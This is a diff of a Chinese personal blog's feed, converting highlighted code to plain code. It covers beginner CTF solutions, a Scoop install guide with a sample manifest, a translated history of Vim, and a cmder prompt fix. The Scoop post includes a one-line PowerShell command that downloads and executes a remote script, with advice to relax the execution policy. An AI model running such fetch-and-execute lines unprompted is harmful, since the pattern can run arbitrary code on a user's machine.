-name<span style="color:#f92672">=</span>$name1$name2
-<span style="color:#75715e">#echo $name</span>
+<pre><code class="language-sh">#!/bin/bash
+
+name1=`cat /dev/urandom | sed 's/[^a-zA-Z0-9]//g' | strings -n 6 | head -n 1`
+name2=&quot;.zip&quot;
+name=$name1$name2
+#echo $name
 
 zip -m $name flag
 
-<span style="color:#66d9ef">while</span> true
-<span style="color:#66d9ef">do</span>
- name1<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>cat /dev/urandom | sed <span style="color:#e6db74">&#39;s/[^a-zA-Z0-9]//g&#39;</span> | strings -n <span style="color:#ae81ff">6</span> | head -n 1<span style="color:#e6db74">`</span>
- name<span style="color:#f92672">=</span>$name1$name2
+while true
+do
+ name1=`cat /dev/urandom | sed 's/[^a-zA-Z0-9]//g' | strings -n 6 | head -n 1`
+ name=$name1$name2
  zip -m $name *.zip
-<span style="color:#66d9ef">done</span>
-</code></pre></div><h3 id="fibs">Fibs</h3>
+done
+</code></pre>
+<h3 id="fibs">Fibs</h3>
 <p>求斐波那契数列第 1234 项，然后 md5(hex(Fibs(1234)))，（转小写后）即为 flag。</p>
 <p>看到这个题……肯定不能自己现场写算法，否则会被跑炸内存的。直接谷歌斐波那契数列快速求第 N 项，得到 O(log N) 的算法后写脚本求项。</p>
 <p>脚本如下</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">Fibonacci_recursion_fast</span>(n):
-    <span style="color:#66d9ef">if</span> n <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
-        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
-    <span style="color:#66d9ef">if</span> n <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
-        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>
-    k <span style="color:#f92672">=</span> (n <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span> <span style="color:#66d9ef">if</span> n <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#66d9ef">else</span> n <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>
-    fib_k <span style="color:#f92672">=</span> Fibonacci_recursion_fast(k)
-    fib_k_1 <span style="color:#f92672">=</span> Fibonacci_recursion_fast(k <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
-    <span style="color:#66d9ef">return</span> fib_k<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> fib_k_1<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span> <span style="color:#66d9ef">if</span> n <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#66d9ef">else</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> fib_k_1 <span style="color:#f92672">+</span> fib_k) <span style="color:#f92672">*</span> fib_k
+<pre><code class="language-py">def Fibonacci_recursion_fast(n):
+    if n == 0:
+        return 0
+    if n == 1:
+        return 1
+    k = (n + 1) / 2 if n % 2 else n / 2
+    fib_k = Fibonacci_recursion_fast(k)
+    fib_k_1 = Fibonacci_recursion_fast(k - 1)
+    return fib_k**2 + fib_k_1**2 if n % 2 else (2 * fib_k_1 + fib_k) * fib_k
 
-<span style="color:#66d9ef">print</span>(hex(Fibonacci_recursion_fast(<span style="color:#ae81ff">1234</span>)))
-</code></pre></div><p>md5 一下，再转小写提交。</p>
+print(hex(Fibonacci_recursion_fast(1234)))
+</code></pre>
+<p>md5 一下，再转小写提交。</p>
 <h2 id="reverse">REVERSE</h2>
 <h3 id="snake">Snake</h3>
 <p>贪吃蛇，玩到 70 分就出 flag</p>
 <h3 id="sstas-python-教室">ssta&rsquo;s Python 教室</h3>
 <p>给的是一个 pyc 文件，在线反编译，得到的代码如下。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e"># encoding: utf-8</span>
+<pre><code class="language-py"># encoding: utf-8
 
-<span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b32encode
-<span style="color:#f92672">import</span> codecs
+from base64 import b32encode
+import codecs
 
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">b32</span>(s):
-    <span style="color:#66d9ef">return</span> b32encode(s)
+def b32(s):
+    return b32encode(s)
 
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rot13</span>(s):
-    <span style="color:#66d9ef">return</span> codecs<span style="color:#f92672">.</span>encode(s, <span style="color:#e6db74">&#39;rot13&#39;</span>)
-    <span style="color:#75715e"># return s.encode(&#39;rot13&#39;)</span>
+def rot13(s):
+    return codecs.encode(s, 'rot13')
+    # return s.encode('rot13')
 
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">reverse</span>(s):
-    <span style="color:#66d9ef">return</span> s[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+def reverse(s):
+    return s[::-1]
 
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">reverseSomeByte</span>(s):
-    <span style="color:#66d9ef">return</span> s[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>:] <span style="color:#f92672">+</span> s[:<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>]
+def reverseSomeByte(s):
+    return s[-6:] + s[:-6]
 
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
-    flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;******************************&#39;</span>
-    cipher <span style="color:#f92672">=</span> reverse(b32(rot13(reverseSomeByte(flag))))
-    <span style="color:#66d9ef">print</span>(cipher)
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;=== WELCOME TO XATUCTF2019 ===&#39;</span>)
-    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;C336VYBGQB56FX5LGLM6FX5MFDNGGTZMGTP4D7MPUT3SXZVP6RP4TQQN&#39;</span>
+def main():
+    flag = '******************************'
+    cipher = reverse(b32(rot13(reverseSomeByte(flag))))
+    print(cipher)
+    print('=== WELCOME TO XATUCTF2019 ===')
+    return 'C336VYBGQB56FX5LGLM6FX5MFDNGGTZMGTP4D7MPUT3SXZVP6RP4TQQN'
 
-<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
-    ffllaagg <span style="color:#f92672">=</span> main()
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;FLAG is right here. Can you get it?&#39;</span>, ffllaagg)
-</code></pre></div><p>重点是 <code>cipher = reverse(b32(rot13(reverseSomeByte(flag))))</code>，与 phpencode 相似，自己写脚本一层一层解密即可。
+if __name__ == '__main__':
+    ffllaagg = main()
+    print('FLAG is right here. Can you get it?', ffllaagg)
+</code></pre>
+<p>重点是 <code>cipher = reverse(b32(rot13(reverseSomeByte(flag))))</code>，与 phpencode 相似，自己写脚本一层一层解密即可。
 自己写的不完善的脚本如下</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e"># -*- encoding: utf-8 -*-</span>
-<span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b32decode
-<span style="color:#f92672">import</span> codecs
+<pre><code class="language-py"># -*- encoding: utf-8 -*-
+from base64 import b32decode
+import codecs
 
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">b32</span>(s):
-    <span style="color:#66d9ef">return</span> b32decode(s)
+def b32(s):
+    return b32decode(s)
 
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rot13</span>(s):
-    <span style="color:#66d9ef">return</span> codecs<span style="color:#f92672">.</span>decode(s, <span style="color:#e6db74">&#39;rot13&#39;</span>)
+def rot13(s):
+    return codecs.decode(s, 'rot13')
 
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">reverse</span>(s):
-    <span style="color:#66d9ef">return</span> s[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+def reverse(s):
+    return s[::-1]
 
-cipher <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;C336VYBGQB56FX5LGLM6FX5MFDNGGTZMGTP4D7MPUT3SXZVP6RP4TQQN&#39;</span>
+cipher = 'C336VYBGQB56FX5LGLM6FX5MFDNGGTZMGTP4D7MPUT3SXZVP6RP4TQQN'
 
-<span style="color:#66d9ef">print</span>(rot13(b32(reverse(cipher))<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;ASCII&#34;</span>)))
-</code></pre></div><p>前六位移到最后即可。</p>
+print(rot13(b32(reverse(cipher)).decode(&quot;ASCII&quot;)))
+</code></pre>
+<p>前六位移到最后即可。</p>
 <hr>
 <p>自己没做出来的题就没写 wp 23333</p>
 ]]></content></item><item><title>初探 Scoop</title><link>https://blog.batkiz.com/posts/2018/using-scoop/</link><pubDate>Mon, 31 Dec 2018 00:23:27 +0000</pubDate><guid>https://blog.batkiz.com/posts/2018/using-scoop/</guid><description>缘起 Linux 用的多了，不免会觉得有一个靠谱好用的包管理器是一件令人身心愉悦的事。许多人也便顺理成章地想要在 Windows 系统上来一个包管理器。 只是一方面微软已</description><content type="html"><![CDATA[<h2 id="缘起">缘起</h2>
@@ -1403,17 +1444,21 @@ cipher <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;C33
 <p>让我们把视线转到 Linux 平台，apt 等包管理器自动进行了软件的依赖分析与解压、配置的过程。Windows 系统之上与之理念相似的便是所谓“绿色软件”——解压即可使用。这也正是 scoop 所做的，利用所写的 mainfest，将解压、配置环境变量等自动化处理。另一方面，Windows 之上大多数软件并无所谓依赖的东西，最多便是一个 VC runtime，这也使得 scoop 的工作量更少了。</p>
 <h2 id="使用">使用</h2>
 <p>Scoop 默认是安装在你的用户文件夹下的，这样自然有着许多好处，例如不需要管理员权限。但如果你想要将其改变，可以在安装之前更改掉 scoop path</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#66d9ef">[environment]</span>::setEnvironmentVariable(<span style="color:#e6db74">&#39;SCOOP&#39;</span>,<span style="color:#e6db74">&#39;C:\soft\Scoop&#39;</span>,<span style="color:#e6db74">&#39;User&#39;</span>)
-$env:SCOOP=<span style="color:#e6db74">&#39;C:\soft\Scoop&#39;</span>
-</code></pre></div><p>其中的 <code>C:\soft\Scoop</code> 自然可以换成你想要的路径。
+<pre><code class="language-powershell">[environment]::setEnvironmentVariable('SCOOP','C:\soft\Scoop','User')
+$env:SCOOP='C:\soft\Scoop'
+</code></pre>
+<p>其中的 <code>C:\soft\Scoop</code> 自然可以换成你想要的路径。
 而后便是执行官网之上的那一行命令</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">iex (new-object net.webclient).downloadstring(<span style="color:#e6db74">&#39;https://get.scoop.sh&#39;</span>)
-</code></pre></div><p>——若是报错，便将 execution policy 更改一下</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Set-ExecutionPolicy RemoteSigned -scope CurrentUser
-</code></pre></div><p>而后再添加上 extras, versions 之类的 bucket，便可愉快的使用了。</p>
+<pre><code class="language-powershell">iex (new-object net.webclient).downloadstring('https://get.scoop.sh')
+</code></pre>
+<p>——若是报错，便将 execution policy 更改一下</p>
+<pre><code class="language-powershell">Set-ExecutionPolicy RemoteSigned -scope CurrentUser
+</code></pre>
+<p>而后再添加上 extras, versions 之类的 bucket，便可愉快的使用了。</p>
 <p>个人推荐先</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ps" data-lang="ps"><span style="color:#a6e22e">scoop</span> <span style="color:#a6e22e">install</span> <span style="color:#a6e22e">sudo</span> <span style="color:#a6e22e">7zip</span> <span style="color:#a6e22e">aria2</span>
-</code></pre></div><p>来获得更好的体验。</p>
+<pre><code class="language-ps">scoop install sudo 7zip aria2
+</code></pre>
+<p>来获得更好的体验。</p>
 <p>其后的使用无非便是 <code>scoop help</code> 中所列举的东西了</p>
 <h2 id="mainfest">mainfest</h2>
 <p>经过一段时间的使用后，你可能会想要将自己在用的许多软件迁移到 scoop 中，但问题也随之而来。</p>
@@ -1421,57 +1466,58 @@ $env:SCOOP=<span style="color:#e6db74">&#39;C:\soft\Scoop&#39;</span>
 <p>放弃自然也是不行的，那么不如自己动手丰衣足食，来自己写一个 mainfest 吧！</p>
 <p>Scoop 的 mainfest 是一个 json 文件，好处很明显，这样一来其应用描述非常简洁。但坏处也肯定是有的，比如说，不支持注释。好在还有着官方的文档供我们查阅。</p>
 <p>下面是一份我写的 mainfest，附上注释，希望能给人点方便。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
-    <span style="color:#f92672">&#34;homepage&#34;</span>: <span style="color:#e6db74">&#34;https://oldj.github.io/SwitchHosts/&#34;</span>,
-    <span style="color:#960050;background-color:#1e0010">//</span> <span style="color:#960050;background-color:#1e0010">此处为软件主页</span>
-    <span style="color:#f92672">&#34;version&#34;</span>: <span style="color:#e6db74">&#34;3.3.12.5349&#34;</span>,
-    <span style="color:#960050;background-color:#1e0010">//</span> <span style="color:#960050;background-color:#1e0010">版本号</span>
-    <span style="color:#f92672">&#34;license&#34;</span>: <span style="color:#e6db74">&#34;MIT&#34;</span>,
-    <span style="color:#960050;background-color:#1e0010">//</span> <span style="color:#960050;background-color:#1e0010">软件所使用的协议</span>
-    <span style="color:#f92672">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;SwitchHosts! is an App for hosts management &amp; switching.&#34;</span>,
-    <span style="color:#960050;background-color:#1e0010">//</span> <span style="color:#960050;background-color:#1e0010">对软件的描述信息</span>
-    <span style="color:#f92672">&#34;architecture&#34;</span>: {
-    <span style="color:#960050;background-color:#1e0010">//</span> <span style="color:#960050;background-color:#1e0010">对于分架构进行分发的软件，可以以</span> <span style="color:#960050;background-color:#1e0010">architecture</span> <span style="color:#960050;background-color:#1e0010">对其区分，如果并不分架构，可直接</span> <span style="color:#960050;background-color:#1e0010">url</span> <span style="color:#960050;background-color:#1e0010">&amp;</span> <span style="color:#960050;background-color:#1e0010">hash</span>
-        <span style="color:#f92672">&#34;64bit&#34;</span>: {
-            <span style="color:#f92672">&#34;url&#34;</span>: <span style="color:#e6db74">&#34;https://github.com/oldj/SwitchHosts/releases/download/v3.3.12/SwitchHosts-win32-x64_v3.3.12.5349.zip&#34;</span>,
-            <span style="color:#960050;background-color:#1e0010">//</span> <span style="color:#960050;background-color:#1e0010">软件包下载链接</span>
-            <span style="color:#f92672">&#34;hash&#34;</span>: <span style="color:#e6db74">&#34;037fbc3b7bba4c9f43e105f00f68733397c1b3099e52eb57308a6659482d3fd0&#34;</span>,
-            <span style="color:#960050;background-color:#1e0010">//</span> <span style="color:#960050;background-color:#1e0010">文件的</span> <span style="color:#960050;background-color:#1e0010">hash</span> <span style="color:#960050;background-color:#1e0010">值，可通过</span> <span style="color:#960050;background-color:#1e0010">Get-FileHash/sha256sum</span> <span style="color:#960050;background-color:#1e0010">来获得</span>
-            <span style="color:#f92672">&#34;extract_dir&#34;</span>: <span style="color:#e6db74">&#34;SwitchHosts!-win32-x64&#34;</span>
-            <span style="color:#960050;background-color:#1e0010">//</span> <span style="color:#960050;background-color:#1e0010">解压的文件夹，指程序压缩包内的文件夹</span>
+<pre><code class="language-json">{
+    &quot;homepage&quot;: &quot;https://oldj.github.io/SwitchHosts/&quot;,
+    // 此处为软件主页
+    &quot;version&quot;: &quot;3.3.12.5349&quot;,
+    // 版本号
+    &quot;license&quot;: &quot;MIT&quot;,
+    // 软件所使用的协议
+    &quot;description&quot;: &quot;SwitchHosts! is an App for hosts management &amp; switching.&quot;,
+    // 对软件的描述信息
+    &quot;architecture&quot;: {
+    // 对于分架构进行分发的软件，可以以 architecture 对其区分，如果并不分架构，可直接 url &amp; hash
+        &quot;64bit&quot;: {
+            &quot;url&quot;: &quot;https://github.com/oldj/SwitchHosts/releases/download/v3.3.12/SwitchHosts-win32-x64_v3.3.12.5349.zip&quot;,
+            // 软件包下载链接
+            &quot;hash&quot;: &quot;037fbc3b7bba4c9f43e105f00f68733397c1b3099e52eb57308a6659482d3fd0&quot;,
+            // 文件的 hash 值，可通过 Get-FileHash/sha256sum 来获得
+            &quot;extract_dir&quot;: &quot;SwitchHosts!-win32-x64&quot;
+            // 解压的文件夹，指程序压缩包内的文件夹
         },
-        <span style="color:#f92672">&#34;32bit&#34;</span>: {
-            <span style="color:#f92672">&#34;url&#34;</span>: <span style="color:#e6db74">&#34;https://github.com/oldj/SwitchHosts/releases/download/v3.3.12/SwitchHosts-win32-ia32_v3.3.12.5349.zip&#34;</span>,
-            <span style="color:#f92672">&#34;hash&#34;</span>: <span style="color:#e6db74">&#34;41e7a2a0cf8261a3fcccfce4cd8d8efc893f3f472dcccd8c3e76623e19f5cf5d&#34;</span>,
-            <span style="color:#f92672">&#34;extract_dir&#34;</span>: <span style="color:#e6db74">&#34;SwitchHosts!-win32-ia32&#34;</span>
+        &quot;32bit&quot;: {
+            &quot;url&quot;: &quot;https://github.com/oldj/SwitchHosts/releases/download/v3.3.12/SwitchHosts-win32-ia32_v3.3.12.5349.zip&quot;,
+            &quot;hash&quot;: &quot;41e7a2a0cf8261a3fcccfce4cd8d8efc893f3f472dcccd8c3e76623e19f5cf5d&quot;,
+            &quot;extract_dir&quot;: &quot;SwitchHosts!-win32-ia32&quot;
         }
     },
-    <span style="color:#f92672">&#34;bin&#34;</span>: <span style="color:#e6db74">&#34;SwitchHosts!.exe&#34;</span>,
-    <span style="color:#960050;background-color:#1e0010">//</span> <span style="color:#960050;background-color:#1e0010">可执行文件</span>
-    <span style="color:#f92672">&#34;shortcuts&#34;</span>: [
+    &quot;bin&quot;: &quot;SwitchHosts!.exe&quot;,
+    // 可执行文件
+    &quot;shortcuts&quot;: [
         [
-            <span style="color:#e6db74">&#34;SwitchHosts!.exe&#34;</span>,
-            <span style="color:#e6db74">&#34;SwitchHosts!&#34;</span>
+            &quot;SwitchHosts!.exe&quot;,
+            &quot;SwitchHosts!&quot;
         ]
     ],
-    <span style="color:#960050;background-color:#1e0010">//</span> <span style="color:#960050;background-color:#1e0010">此处为将其快捷方式加入开始菜单的配置</span>
-    <span style="color:#f92672">&#34;checkver&#34;</span>: {
-        <span style="color:#f92672">&#34;url&#34;</span>: <span style="color:#e6db74">&#34;https://github.com/oldj/SwitchHosts/releases&#34;</span>,
-        <span style="color:#f92672">&#34;re&#34;</span>: <span style="color:#e6db74">&#34;SwitchHosts-win32-x64_v([\\d.]+).zip&#34;</span>
+    // 此处为将其快捷方式加入开始菜单的配置
+    &quot;checkver&quot;: {
+        &quot;url&quot;: &quot;https://github.com/oldj/SwitchHosts/releases&quot;,
+        &quot;re&quot;: &quot;SwitchHosts-win32-x64_v([\\d.]+).zip&quot;
     },
-    <span style="color:#960050;background-color:#1e0010">//</span> <span style="color:#960050;background-color:#1e0010">自动检查更新所用，不过我这里好像是有点小问题的</span>
-    <span style="color:#f92672">&#34;autoupdate&#34;</span>: {
-        <span style="color:#f92672">&#34;architecture&#34;</span>: {
-            <span style="color:#f92672">&#34;64bit&#34;</span>: {
-                <span style="color:#f92672">&#34;url&#34;</span>: <span style="color:#e6db74">&#34;https://github.com/oldj/SwitchHosts/releases/download/v$majorVersion.$minorVersion.$patchVersion/SwitchHosts-win32-x64_v$version.zip&#34;</span>
+    // 自动检查更新所用，不过我这里好像是有点小问题的
+    &quot;autoupdate&quot;: {
+        &quot;architecture&quot;: {
+            &quot;64bit&quot;: {
+                &quot;url&quot;: &quot;https://github.com/oldj/SwitchHosts/releases/download/v$majorVersion.$minorVersion.$patchVersion/SwitchHosts-win32-x64_v$version.zip&quot;
             },
-            <span style="color:#f92672">&#34;32bit&#34;</span>: {
-                <span style="color:#f92672">&#34;url&#34;</span>: <span style="color:#e6db74">&#34;https://github.com/oldj/SwitchHosts/releases/download/v$majorVersion.$minorVersion.$patchVersion/SwitchHosts-win32-ia32_v$version.zip&#34;</span>
+            &quot;32bit&quot;: {
+                &quot;url&quot;: &quot;https://github.com/oldj/SwitchHosts/releases/download/v$majorVersion.$minorVersion.$patchVersion/SwitchHosts-win32-ia32_v$version.zip&quot;
             }
         }
     }
 }
-</code></pre></div><p>上面的这份已被收入 <a href="https://github.com/lukesampson/scoop-extras/pull/1519">extras bucket</a> 中，不过上面的<a href="https://github.com/lukesampson/scoop-extras/pull/1519#issuecomment-447215864">检查更新的配置貌似还有点小问题</a>。</p>
+</code></pre>
+<p>上面的这份已被收入 <a href="https://github.com/lukesampson/scoop-extras/pull/1519">extras bucket</a> 中，不过上面的<a href="https://github.com/lukesampson/scoop-extras/pull/1519#issuecomment-447215864">检查更新的配置貌似还有点小问题</a>。</p>
 ]]></content></item><item><title>翻译 | Vim 的诞生</title><link>https://blog.batkiz.com/posts/2018/where-vim-came-from/</link><pubDate>Tue, 23 Oct 2018 12:55:18 +0000</pubDate><guid>https://blog.batkiz.com/posts/2018/where-vim-came-from/</guid><description>原文：Where Vim Came From 另投稿于 煎蛋 translated by batkiz &amp;amp; RUInsYi @ Par-Tuner 我最近偶然发现了一个名为 Intel HEX 的文件格式。据我所了解，Intel HEX 文件（使用 .hex 扩展名），将二值</description><content type="html"><![CDATA[<p>原文：<a href="https://twobithistory.org/2018/08/05/where-vim-came-from.html">Where Vim Came From</a></p>
 <p>另投稿于 <a href="http://jandan.net/2018/10/22/vim.html">煎蛋</a></p>
 <blockquote>
@@ -1491,30 +1537,31 @@ $env:SCOOP=<span style="color:#e6db74">&#39;C:\soft\Scoop&#39;</span>
 <p><img src="https://s1.ax1x.com/2018/10/17/idh2qI.jpg" alt="Ken_Thompson_(sitting)_and_Dennis_Ritchie_at_PDP-11_(2876612463).jpg"></p>
 <p><code>ed</code> 不允许你在打开的缓冲区里的其他行中编辑恰当的行，或者是移动光标，因为每当你改变了文件，<code>ed</code> 会必须重印整个文件。1969 年并没有让 <code>ed</code>“清除”屏幕上内容的机制，因为屏幕其实仅仅是一张纸，输出的所有东西都已经被墨水印到了纸上。如有必要，你可以使用列出命令(<code>l</code>)让 <code>ed</code> 为你打印出一行行内容，但大多数时间你都在操控着你不能看见的文本。因此使用 <code>ed</code> 就像是在一个昏暗的房子里用着一个几乎没电的手电筒，尝试着找对路。你一次能看到如此多东西，所以你必须尽你所能来记住一切都在哪里。</p>
 <p>下面是一个 <code>ed</code> 会话的例子。我已经添加了注释（在 <code>#</code> 标记之后）来解释每行的用途，尽管 <code>ed</code> 并不会将输入的这些识别为注释且会报错：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>sinclairtarget 09:49 ~<span style="color:#f92672">]</span>$ ed
-i                           <span style="color:#75715e"># 进入输入模式</span>
+<pre><code class="language-bash">[sinclairtarget 09:49 ~]$ ed
+i                           # 进入输入模式
 Hello world!
 
-Isn<span style="color:#e6db74">&#39;t it a nice day?
-</span><span style="color:#e6db74">.                           # 结束输入
-</span><span style="color:#e6db74">1,2l                        # 列出1、2行
-</span><span style="color:#e6db74">Hello world!$
-</span><span style="color:#e6db74">$
-</span><span style="color:#e6db74">2d                          # 删除第 2 行
-</span><span style="color:#e6db74">,l                          # 列出整个缓冲区
-</span><span style="color:#e6db74">Hello world!$
-</span><span style="color:#e6db74">Isn&#39;</span>t it a nice day?$
-s/nice/terrible/g           <span style="color:#75715e"># 全局替换</span>
+Isn't it a nice day?
+.                           # 结束输入
+1,2l                        # 列出1、2行
+Hello world!$
+$
+2d                          # 删除第 2 行
+,l                          # 列出整个缓冲区
+Hello world!$
+Isn't it a nice day?$
+s/nice/terrible/g           # 全局替换
 ,l
 Hello world!$
-Isn<span style="color:#e6db74">&#39;t it a terrible day?$
-</span><span style="color:#e6db74">w foo.txt                   # 写入 foo.txt
-</span><span style="color:#e6db74">38                          # (写入的字节数)
-</span><span style="color:#e6db74">q                           # 退出
-</span><span style="color:#e6db74">[sinclairtarget 10:50 ~]$ cat foo.txt
-</span><span style="color:#e6db74">Hello world!
-</span><span style="color:#e6db74">Isn&#39;</span>t it a terrible day?
-</code></pre></div><p>正如你所见到的，<code>ed</code> 并不是一个特别健谈的程序。</p>
+Isn't it a terrible day?$
+w foo.txt                   # 写入 foo.txt
+38                          # (写入的字节数)
+q                           # 退出
+[sinclairtarget 10:50 ~]$ cat foo.txt
+Hello world!
+Isn't it a terrible day?
+</code></pre>
+<p>正如你所见到的，<code>ed</code> 并不是一个特别健谈的程序。</p>
 <h2 id="bill-joy-与一个文本编辑器">Bill Joy 与一个文本编辑器</h2>
 <p><code>ed</code> 对 Thompson 和 Ritchie 来说完全够用。其他人则认为其难于使用，并且它成为了 Unix 对新手的敌意的一个臭名昭著的例子。<sup id="fnref:6"><a href="#fn:6" class="footnote-ref" role="doc-noteref">6</a></sup> 1975 年，一个名叫 George Coulouris 的男子在伦敦玛丽王后大学的 Unix 系统上开发了 <code>ed</code> 的一个改进版本。Coulouris 写了他的编辑器是为了利用他在伦敦玛丽王后大学能获得的显示屏。不像 <code>ed</code>，Coulouris 的程序允许用户编辑屏幕上恰当的一行，通过一下下的击键来在行间移动（想象下你一次只在一行里使用 Vim）。Coulouris 称他的程序为 <code>em</code>，或称&quot;editor for mortals（模式编辑器）&quot;，这可能是在 Thompson 造访伦敦玛丽王后大学，见了 Coulouris 所写的程序并驳斥之，称他不需要在编辑一个文件时查看它的状态之后。</p>
 <p>1976 年，Coulouris 带着 <code>em</code> 到了加州大学伯克利分校，他在那里作为计算机科学系的访问者待了一整个夏天。这刚好是在 Ken Thompson 离开伯克利前往贝尔实验室的十年之后。在伯克利，Coulouris 见到了 Bill Joy，一个正在工作于伯克利软件套件(BSD)的研究生。Coulouris 给 Joy 展示了 <code>em</code>，Joy 便在 Coulouris 的源代码上开始构建 <code>ed</code> 的一个改进版本，称之为 <code>ex</code>，即&quot;extended <code>ed</code>（扩展版 <code>ed</code>）&quot;。1978 年，<code>ex</code> 的 1.1 版本与 BSD 的首个发布版本捆绑释出。<code>ex</code> 很大程度上与 <code>ed</code> 兼容，但添加了两个模式：一个“打开”模式，启用与 <code>em</code> 上相似的单行编辑；一个“可视”模式，接管整个屏幕并允许我们像今天那样实时编辑整个文件。</p>
@@ -1899,16 +1946,18 @@ Isn<span style="color:#e6db74">&#39;t it a terrible day?$
 在cmder中，无论英文还是中文，输入的光标变宽或者多一个字符。</p>
 <h2 id="解决方法">解决方法</h2>
 <p>进入 <code>%CMDER_ROOT%\vendor</code> 文件夹，编辑 <code>profile.ps1</code>，寻找下列信息(<code>Ctrl + F</code>)</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ps" data-lang="ps"><span style="color:#a6e22e">Microsoft.PowerShell.Utility\Write-Host</span> <span style="color:#a6e22e">&#34;`nλ</span> <span style="color:#a6e22e">&#34;</span> <span style="color:#a6e22e">-NoNewLine</span> <span style="color:#a6e22e">-ForegroundColor</span> <span style="color:#a6e22e">&#34;DarkGray&#34;</span>
-</code></pre></div><p>将其中的 <code>λ</code> 改为 <code>#</code> 或其它字符即可。</p>
+<pre><code class="language-ps">Microsoft.PowerShell.Utility\Write-Host &quot;`nλ &quot; -NoNewLine -ForegroundColor &quot;DarkGray&quot;
+</code></pre>
+<p>将其中的 <code>λ</code> 改为 <code>#</code> 或其它字符即可。</p>
 <hr>
 <p>如果使用的是 cmd，则编辑 <code>clink.lua</code>，寻找</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-lua" data-lang="lua"><span style="color:#66d9ef">if</span> env <span style="color:#f92672">==</span> <span style="color:#66d9ef">nil</span> <span style="color:#66d9ef">then</span>
-    lambda <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;λ&#34;</span>
-<span style="color:#66d9ef">else</span>
-    lambda <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;(&#34;</span><span style="color:#f92672">..</span>env<span style="color:#f92672">..</span><span style="color:#e6db74">&#34;) λ&#34;</span>
-<span style="color:#66d9ef">end</span>
-</code></pre></div><p>将其中的 <code>λ</code> 改为 <code>#</code> 或其它字符即可。</p>
+<pre><code class="language-lua">if env == nil then
+    lambda = &quot;λ&quot;
+else
+    lambda = &quot;(&quot;..env..&quot;) λ&quot;
+end
+</code></pre>
+<p>将其中的 <code>λ</code> 改为 <code>#</code> 或其它字符即可。</p>
 ]]></content></item><item><title>a-short-introduction-to-markdown</title><link>https://blog.batkiz.com/posts/2018/a-short-introduction-to-markdown/</link><pubDate>Thu, 29 Mar 2018 21:14:10 +0000</pubDate><guid>https://blog.batkiz.com/posts/2018/a-short-introduction-to-markdown/</guid><description>markdown 是什么 Markdown 是一种 轻量级标记语言，创始人为 约翰·格鲁伯（英语：John Gruber）。它允许人们“使用易读易写的纯文本格式编写文档，然后转换成</description><content type="html"><![CDATA[<h2 id="markdown-是什么">markdown 是什么</h2>
 <blockquote>
